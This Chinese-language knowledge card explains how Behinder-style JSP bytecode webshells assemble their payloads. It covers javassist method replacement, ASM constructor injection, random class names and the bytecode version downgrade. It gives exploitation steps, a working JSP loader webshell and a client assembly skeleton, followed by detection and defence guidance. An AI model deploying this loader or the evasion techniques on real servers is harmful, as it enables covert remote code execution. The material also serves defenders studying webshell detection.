---
id: web-java-classloader-behinder-bytecode-payload-assembly
title: 冰蝎式 JSP 字节码 Webshell 的载荷组装：javassist 替换 Encrypt、ASM 向构造器注入参数、随机类名与版本降级
type: scenario
domain: web
path: web/java/classloader
technique: behinder-bytecode-payload-assembly
aliases:
- 冰蝎 payload 组装
- Behinder Params.getParamedClass
- JSP 字节码马
- defineClass 加载 class 字节码
- ClassLoader g(byte[])  马
- javassist getAndRename 随机类名
- ASM ClassAdapter 注入构造器参数
- equals(pageContext) 调用约定
tags:
- java
- jsp
- webshell
- bytecode
- classloader
- javassist
- asm
- behinder
- defense-evasion
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-22
  verified_at: '2026-11-08T13:33:10+08:00'
  notes: 补记卡核对：确认此卡系先前中断运行自本篇 staging 草稿 add 入库（status=draft），本次仅补记 cards.json，staging 草稿已按 dedup merge 规则 reject 入回收站（20261108-124018-behinder-bytecode-payload-assembly）。卡内容与原文逐项一致：javassist 替换 Encrypt、ASM ClassAdapter 向 <init> 注入参数（0xfffa 分块）、随机类名与常量池字节替换、class 版本 result[7]=50（Java 8 降级）、defineClass+equals(pageContext) 调用约定、CustomCryptor 的 encode/decode class 动态加载；3 张截图（功能界面、payload/java 类列表、getData 断点）佐证。原文无组件版本标记，affected_versions 不设
---

## 一句话结论

冰蝎这类 JSP 字节码马自身不含任何命令执行代码：客户端先用 javassist 把传输协议的 `Encrypt` 方法“塞进”原始 payload 类（如 `Cmd`）、用 ASM 把本次请求的参数写进 `<init>` 构造器、再做类名随机化与字节级替换，最后整体加密后作为 POST body 发出；服务端 JSP 只做 `ClassLoader.defineClass(bytes)` → `newInstance()` → `equals(pageContext)` 三步，因此静态查杀看不到 `Runtime`/`exec`，看到的是一个“加载任意字节码”的通用宿主。

## 原理

- **服务端只是一个通用加载器**：JSP 里声明 `class U extends ClassLoader { public Class g(byte[] b){ return super.defineClass(b,0,b.length); } }`，POST 时把 body 全部读进 `ByteArrayOutputStream`，交给 `Decrypt()` 后 `new U(this.getClass().getClassLoader()).g(...).newInstance().equals(pageContext)`。`defineClass` 是 JVM 提供的“把字节数组变成 Class”的入口，不需要落盘 `.class`，也不需要在 JSP 里写任何具体功能。
- **`equals(pageContext)` 是调用约定而不是比较**：payload 类被要求实现 `equals(Object)`，参数为 `pageContext`；服务端 `newInstance()` 触发构造器（参数已在客户端注入），`equals` 里再用 `pageContext.getRequest()/getResponse()` 取请求响应完成实际操作。因此 payload 类必须“可无参 newInstance”，参数只能走字段或构造器常量。
- **客户端为什么需要 javassist**：原始 payload（`Cmd`、`FileOperation`、`SocksProxy` 等）里没有 `Encrypt` 方法，而每种传输协议（AES base64、异或、自定义等）的加密实现不同。`processTransProtocol()` 用 `cp.getAndRename("net.rebeyond.behinder.payload.java.Cmd", 随机名)` 取到类，`removeMethod(getDeclaredMethod("Encrypt"))` 后用 `CtNewMethod.make(transProtocol.getEncode(), pocClass)` 动态生成对应协议的 `Encrypt` 并加入，再 `setName(className)` 改回原名。这样同一份 payload 源码可以适配任意协议，服务端不需要内置解密逻辑。
- **参数为什么要写进构造器**：`processClassParams()` 用 ASM 的 `ClassAdapter` 拦截 `visitMethod`，只处理 `<init>`，对每个参数用 `Params.setJavaParam()` 以 `LDC` 常量形式插入。由于 class 文件单个常量长度受 `CONSTANT_Utf8` 的 65535 字节限制，代码用 `blockSize = 0xfffa`（65530）分块，超长参数会被 `Utils.splitString()` 拆成多段再拼接——这是“能传大文件/大命令行的原因”。
- **类名随机化与常量池字节替换**：改名后 `toBytecode()` 得到的 class 内部仍有旧的类名引用。代码直接在字节层面 `Utils.replaceBytes()` 替换两处：`(len+2, 76 'L') + 类名` 与 `(len) + 类名`，前者对应常量池里的 `Lcom/...;` 描述符（'L' 表示对象类型），后者是普通 `CONSTANT_Utf8`，且长度前缀也要一起改成新长度，否则 class 解析会错位。这一步让每次请求的 class 名字都不同，规避基于固定类名的特征检测。
- **版本降级**：最后执行 `result[7] = 50`。按 class 文件格式（magic 4 字节 + minor 2 字节 + major 2 字节），偏移 7 是 major_version 的低字节，置 50 得到 major 50，对应 Java 6 字节码；原文注释写作“Java 8”（应为 52），此处以字节实际含义为准，存疑点记入置信度。降版本是为了让高版本 JDK 编译出的 payload 也能被低版本 JVM 的 `defineClass` 接受。
- **传输链路**：`Utils.getData(cryptor, className, params, "jsp", extraData)` 先 `Params.getParamedClass()` 拿到“已注入加密函数与参数”的 class 字节，再 `cipherUtils.mergeByteArray(bincls, extraData)` 追加额外数据（如上传文件内容），最后 `cryptor.encrypt()` 整体加密。`CustomCryptor` 同样用 `defineClass` 把 `Encode`/`Decrypt` 源码编译成类、反射 `invoke`，所以连客户端的加解密实现都是动态的。

## 触发条件

- 目标为 Java Web（JSP 可执行），攻击者已具备写入/上传 JSP 的能力。
- 该 JSP 能读 `request.getInputStream()` 的原始 body，并能使用 `pageContext`；容器未禁用 `ClassLoader.defineClass`（标准 JVM 无法禁用）或未做严格的字节码加载监控。
- 客户端与服务端的传输协议（密钥、加密算法、`Encrypt`/`Decrypt` 方法名）保持一致，否则 payload 解不出或类加载失败。
- payload 依赖的类（`java.io`、`java.net`、`java.lang.reflect` 等）在容器类路径中可用；JDK 版本不低于 payload 的字节码版本。

## 利用步骤

1. 在本地准备 payload 源类（如 `Cmd`），实现 `equals(Object pageContext)`，从 `pageContext` 取 request/response 并执行实际操作。
2. 选择传输协议，取到其 `encode`/`decode` 源码字符串；用 javassist `ClassPool.getAndRename()` 载入 payload 类到随机名，删除原有 `Encrypt`，`CtNewMethod.make(encode, cc)` 生成新方法并加入，再 `setName()` 改回原名。
3. 用 ASM `ClassReader`/`ClassWriter` 遍历，只改写 `<init>`：把每个参数按 `0xfffa` 分块后以 `LDC` 常量插入构造器（超长值先 `splitString` 再拼接）。
4. `toBytecode()` 后做两轮字节替换修正常量池中的类名与长度前缀，并把 `result[7]` 置为 50 降低字节码版本。
5. `cipherUtils.mergeByteArray()` 追加 extraData（可选），`cryptor.encrypt()` 整体加密。
6. POST 到 JSP：body 为密文，服务端 `Decrypt` → `defineClass` → `newInstance` → `equals(pageContext)`，功能随 payload 而定（命令执行、文件管理、内网穿透、数据库操作等）。

## PoC

服务端最小宿主（与冰蝎马结构一致，`Decrypt` 留空表示不加密，仅用于理解调用约定）：

```jsp
<%@page import="java.util.*,java.io.*"%>
<%! class U extends ClassLoader {
        U(ClassLoader c){ super(c); }
        public Class g(byte[] b){ return super.defineClass(b,0,b.length); }
    } %>
<% if (request.getMethod().equals("POST")) {
     ByteArrayOutputStream bos = new ByteArrayOutputStream();
     byte[] buf = new byte[512];
     int len = request.getInputStream().read(buf);
     while (len > 0) {
         bos.write(Arrays.copyOfRange(buf,0,len));
         len = request.getInputStream().read(buf);
     }
     out.clear(); out = pageContext.pushBody();
     new U(this.getClass().getClassLoader())
         .g(bos.toByteArray())      // 直接加载请求体里的 class
         .newInstance()
         .equals(pageContext);      // 触发 payload 的 equals
   } %>
```

客户端组装骨架（对应原文 `Params.java`）：

```java
byte[] build(String className, Map<String,String> params, TransProtocol proto) throws Exception {
    ClassPool cp = ClassPool.getDefault();
    CtClass cc = cp.getAndRename("net.rebeyond.behinder.payload.java." + className,
                                 Utils.getRandomString(10));
    cc.removeMethod(cc.getDeclaredMethod("Encrypt"));
    cc.addMethod(CtNewMethod.make(proto.getEncode(), cc));   // 注入对应协议的加密实现
    cc.setName(className);
    byte[] bytes = cc.toBytecode();
    cc.detach();

    // ASM：只改 <init>，把参数以常量形式塞进构造器（>0xfffa 需分块）
    ClassReader cr = new ClassReader(bytes);
    ClassWriter cw = new ClassWriter(1);
    cr.accept(new ClassAdapter(cw) {
        public MethodVisitor visitMethod(int a, String n, String d, String s, String[] e) {
            MethodVisitor mv = cv.visitMethod(a, n, d, s, e);
            if (n.equals("<init>")) {
                for (String k : params.keySet())
                    Params.setJavaParam(className, mv, k,
                        params.get(k).length() > 0xfffa
                            ? Utils.splitString(params.get(k), 0xfffa)
                            : new String[]{ params.get(k) });
                mv.visitEnd();
            }
            return mv;
        }
    }, 0);
    byte[] out = cw.toByteArray();
    // 常量池类名替换（'L' 描述符与普通 Utf8 两种形态，长度前缀同步改）
    out = Utils.replaceBytes(out,
            Utils.mergeBytes(new byte[]{(byte)(srcLen+2), 76}, src.getBytes()),
            Utils.mergeBytes(new byte[]{(byte)(dstLen+2), 76}, dst.getBytes()));
    out[7] = 50;                       // major_version 低字节 → Java 6 字节码
    return out;
}
```

## 变体与关联

- 变体：把服务端 `Decrypt` 做成 AES/XOR/Base64 等协议，或直接在客户端预加密、JSP 只做 Base64 解码；协议与 payload 解耦正是这套组装流程的目的。
- 变体：`getParamedClass` 支持缓存（`payloadClassCache`/`legacyPayloadClassCache`），同一类同一协议只生成一次，实际攻击中连续操作几乎无额外开销。
- 变体：服务端把 `defineClass` 换成 `Unsafe.defineAnonymousClass`、`MethodHandles.Lookup.defineClass`，或加载后注册成内存 Servlet/Filter 变为无文件内存马，参见 `[[web-java-classloader-jsp-memory-servlet-webshell]]`、`[[web-java-classloader-unsafe-anonymous-class-jsp-shell]]`。
- 关联：`[[web-java-classloader-gzip-base64-dnslog-jsp-webshell]]`（类 blob 内嵌在 JSP 里的变体）、`[[web-java-classloader-methodhandles-lookup-defineclass-same-package]]`。
- 边界：容器禁用 `pageContext.pushBody()`、响应包装导致 `out.clear()` 抛异常时需要按注释放开 `out.clear(); out=pageContext.pushBody();`；JDK 版本低于 payload 字节码版本、`defineClass` 抛 `ClassFormatError`（常量池长度替换错误）时加载失败；`Runtime.exec` 等 API 被 SecurityManager/Agent 拦截时功能受限。

## 检测与防御

- **静态检测**：搜 JSP 中出现 `extends ClassLoader` + `defineClass` + `pageContext.pushBody` + `request.getInputStream()` 组合；正常业务 JSP 几乎不会自己加载字节码。也关注 `new U(this.getClass().getClassLoader()).g(` 这类固定调用形态，以及 `equals(pageContext)` 结尾。
- **动态检测**：RASP/Java Agent 钩住 `ClassLoader.defineClass`，记录加载来源为“非文件、非 JAR、由 JSP 类发起”的调用；钩住 `Runtime.exec`/`ProcessBuilder` 时回溯调用栈里是否存在动态生成的类（类名随机、无对应 `.class` 文件）。
- **流量检测**：JSP 接口收到 `Content-Type` 不规范、body 为二进制且长度规整（常见 4/8/16 字节对齐）、响应体极短或为空，多次请求的 body 大小随参数变化——与普通表单/JSON 流量差异明显。
- **内存马排查**：dump 运行中的类列表，找出无对应磁盘文件、类名为随机字符串、major version 偏低（50 左右）却引用容器 API 的类；结合 `attach` 到 JVM 用 `ClassLoader` 遍历比对。
- **防御**：Web 目录禁止脚本写入（上传目录不给执行权限）、JSP 上传做后缀与内容双重校验；部署 RASP 监控 `defineClass` 与命令执行；对 JSP 文件做完整性基线，发现新增/篡改立即告警。
- **响应**：删除宿主 JSP 并重启应用（内存中的类不会随文件删除消失），用 Agent 导出可疑类字节码做取证，排查同批次上传的其它文件与后续横向行为。
